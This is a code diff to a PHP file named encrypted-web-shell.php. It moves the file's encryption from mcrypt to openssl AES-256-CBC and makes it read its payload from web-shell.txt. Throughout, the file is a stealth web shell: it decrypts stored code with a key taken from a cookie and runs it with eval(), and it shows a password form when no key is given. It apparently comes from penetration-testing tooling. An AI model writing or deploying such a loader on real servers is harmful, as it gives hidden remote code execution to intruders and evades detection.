@@ -11,22 +11,23 @@ of your code, whether its shell, penetration testing or remote management and sy
 // You can set this manually here in order to encrypt your file the first time. Dont forget to remove after
 //$key = '1234567891011120';
 
-define('IV_SIZE', mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC));
-
 function encrypt($key, $payload) {
-  $iv = mcrypt_create_iv(IV_SIZE, MCRYPT_DEV_URANDOM);
-  $crypt = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $payload, MCRYPT_MODE_CBC, $iv);
-  $combo = $iv . $crypt;
-  $garble = base64_encode($iv . $crypt);
-  return $garble;
+    if (!empty($key) && !empty($payload)) {
+        $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));
+        $encrypted = openssl_encrypt($payload, 'aes-256-cbc', $key, 0, $iv);
+        return base64_encode($encrypted . '::' . $iv);
+    } else {
+        return false;
+	}
 }
 
 function decrypt($key, $garble) {
-  $combo = base64_decode($garble);
-  $iv = substr($combo, 0, IV_SIZE);
-  $crypt = substr($combo, IV_SIZE, strlen($combo));
-  $payload = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key, $crypt, MCRYPT_MODE_CBC, $iv);
-  return $payload;
+    if (!empty($key) && !empty($garble)) {
+        list($encrypted_data, $iv) = explode('::', base64_decode($garble), 2);
+        return openssl_decrypt($encrypted_data, 'aes-256-cbc', $key, 0, $iv);
+    } else {
+        return false;
+    }
 }
 
 /* Get code to encrypt it
@@ -43,18 +44,18 @@ if (!empty($_POST['dec'])) {
 
 if (isset($_COOKIE['dec'])) {
 	// If the cookie is set , try decrypting and running
-        $key = $_COOKIE['dec'];
-	$code = "paste encrypted string here";
-        eval(decrypt($key, $code));
+    $key = $_COOKIE['dec'];
+	$code = file_get_contents('./web-shell.txt');
+    eval(decrypt($key, $code));
 } else {
 	// If no cookie is set or POST received, unset the cookie variables if they already (for some reason) exist
 	// Also deliver the input form by default.
-        setcookie("dec", "", time() - 3600);
-        $_COOKIE['dec'] = null;
-        echo '<html><body><form action="encrypted-web-shell.php" method="post">
-                <input type="password" autocomplete="off" class="inputtext" name="dec" id="dec">
-                <input value="submit" type="submit">
-                </form>';
+    setcookie("dec", "", time() - 3600);
+    $_COOKIE['dec'] = null;
+    echo '<html><body><form action="encrypted-web-shell.php" method="post">
+    	<input type="password" autocomplete="off" class="inputtext" name="dec" id="dec">
+    	<input value="submit" type="submit">
+    	</form>';
 }
 
 ?>
